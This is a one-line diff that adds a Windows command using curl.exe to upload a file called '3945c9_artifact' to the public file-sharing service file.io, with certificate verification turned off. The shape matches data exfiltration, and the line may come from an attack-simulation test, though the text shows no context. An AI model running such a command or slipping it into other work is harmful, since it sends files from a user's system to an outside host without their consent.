@@ -1,0 +1,1 @@
+C:\Windows\System32\Curl.exe -k -F "file=@3945c9_artifact" https://file.io/
